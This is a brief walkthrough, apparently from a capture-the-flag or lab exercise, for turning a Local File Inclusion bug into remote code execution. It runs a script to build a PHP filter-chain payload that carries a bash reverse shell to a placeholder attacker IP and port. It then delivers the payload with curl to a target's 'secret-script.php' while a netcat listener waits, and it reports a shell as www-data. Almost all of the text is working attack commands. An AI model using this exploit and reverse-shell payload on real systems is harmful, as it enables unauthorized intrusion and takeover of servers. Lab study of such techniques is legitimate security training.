[0] use this (x.py) to gain remote code execution (RCE).
Python script to help generate a PHP filter payload.
This would allow us to leverage the LFI (Local File Inclusion) to execute arbitrary commands on the server.



[1] Run the following command:
please change YOUR_IP and YOUR_PORT

python3 x.py --chain "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\"'); ?>" | grep "^php" > payload.txt



[2] And we get the payloads: payload.txt



[3] Using the generated payload, equip `curl` to execute it on the target system. 
With netcat listener already running, you will quickly gain a shell as the www-data user.
Curl the payload.txt to the victim machine after starting the nectcat listener on port 4444:
please change IP-TARGET

curl "http://IP-TARGET/secret-script.php?file=$(cat payload.txt)"



[4] And we get the shell as www-data